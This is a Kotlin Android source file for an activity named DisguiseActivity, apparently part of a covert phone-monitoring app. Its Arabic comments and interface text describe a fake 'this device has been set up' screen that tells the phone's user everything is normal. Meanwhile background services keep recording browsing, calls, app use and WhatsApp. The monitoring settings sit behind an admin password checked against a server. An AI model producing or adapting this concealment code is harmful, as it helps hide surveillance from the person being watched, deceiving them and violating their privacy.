package com.family.monitor

import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

/**
 * شاشة التمويه — تظهر بعد إكمال الإعداد والأذونات على الجهاز الفرعي.
 *
 * الشكل: شاشة عادية بريئة تمامًا (مثل شاشة إنهاء إعداد النظام) —
 * صورة/كلمة واحدة + زر واحد فقط. الضغط على الزر يطلب كلمة مرور الأدمن،
 * وعند إدخالها الصحيحة فقط تفتح شاشة الإعدادات والأذونات.
 *
 * خدمات المراقبة (التصفح/المكالمات/التطبيقات/واتساب) تستمر في الخلفية
 * طالما الصلاحيات ممنوحة وخدمة المراقبة تعمل — بغض النظر عن هذه الشاشة.
 */
class DisguiseActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportActionBar?.hide()

        val density = resources.displayMetrics.density
        fun dp(v: Int) = (v * density).toInt()

        // خلفية هادئة (تدرج رمادي/أزرق فاتح — شكل نظامي)
        val bg = GradientDrawable(
            GradientDrawable.Orientation.TL_BR,
            intArrayOf(Color.parseColor("#F1F5F9"), Color.parseColor("#DBEAFE"), Color.parseColor("#E2E8F0"))
        )

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            background = bg
            setPadding(dp(24), dp(24), dp(24), dp(24))
        }

        // دائرة أيقونة بسيطة (شكل نظامي بريء)
        val iconWrap = LinearLayout(this).apply {
            gravity = Gravity.CENTER
            orientation = LinearLayout.VERTICAL
        }
        val iconBg = GradientDrawable().apply {
            shape = GradientDrawable.OVAL
            setColor(Color.WHITE)
            setSize(dp(84), dp(84))
        }
        val checkMark = TextView(this).apply {
            text = "✓"
            textSize = 40f
            setTextColor(Color.parseColor("#10B981"))
            gravity = Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD
        }
        iconWrap.addView(LinearLayout(this).apply {
            background = iconBg
            gravity = Gravity.CENTER
            addView(checkMark)
        }, LinearLayout.LayoutParams(dp(84), dp(84)))
        root.addView(iconWrap)

        root.addView(TextView(this).apply {
            text = "تم إعداد هذا الجهاز"
            textSize = 22f
            setTextColor(Color.parseColor("#1E293B"))
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(24), 0, 0)
        })

        root.addView(TextView(this).apply {
            text = "الخدمات تعمل الآن بشكل صحيح وسيتم تحسين أداء الجهاز تلقائيًا.\nيمكنك استخدام الهاتف بشكل طبيعي."
            textSize = 14f
            setTextColor(Color.parseColor("#64748B"))
            gravity = Gravity.CENTER
            setPadding(dp(12), dp(12), dp(12), 0)
            lineHeight = dp(24)
        })

        // الزر الوحيد — يطلب كلمة مرور الأدمن لفتح الإعدادات
        root.addView(Button(this).apply {
            text = "تم"
            textSize = 15f
            setTextColor(Color.WHITE)
            background = GradientDrawable().apply {
                cornerRadius = 14f * density
                setColor(Color.parseColor("#334155"))
            }
            setPadding(dp(48), dp(10), dp(48), dp(10))
            setOnClickListener { askPassword() }
        }, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { topMargin = dp(40) })

        setContentView(root, ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ))
    }

    private fun askPassword() {
        val pad = (16 * resources.displayMetrics.density).toInt()
        val input = EditText(this).apply {
            hint = "كلمة المرور"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(pad / 2, pad / 2, pad / 2, pad / 2)
        }
        val wrap = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad / 2, pad, 0)
            addView(input)
        }

        AlertDialog.Builder(this)
            .setTitle("إعدادات متقدمة")
            .setMessage("أدخل كلمة المرور للمتابعة")
            .setView(wrap)
            .setPositiveButton("متابعة") { d, _ ->
                val pwd = input.text.toString().trim()
                if (pwd.isEmpty()) {
                    Toast.makeText(this, "أدخل كلمة المرور", Toast.LENGTH_SHORT).show()
                } else {
                    checkPassword(pwd)
                }
                d.dismiss()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    private fun checkPassword(password: String) {
        val server = Prefs.serverUrl(this) ?: Config.DEFAULT_SERVER_URL
        Toast.makeText(this, "جارٍ التحقق...", Toast.LENGTH_SHORT).show()
        Thread {
            val ok = try {
                Api.verifyPassword(server, password)
            } catch (_: Exception) {
                false
            }
            runOnUiThread {
                if (ok) {
                    startActivity(Intent(this, SetupActivity::class.java))
                    finish()
                } else {
                    Toast.makeText(this, "كلمة المرور غير صحيحة", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }
}
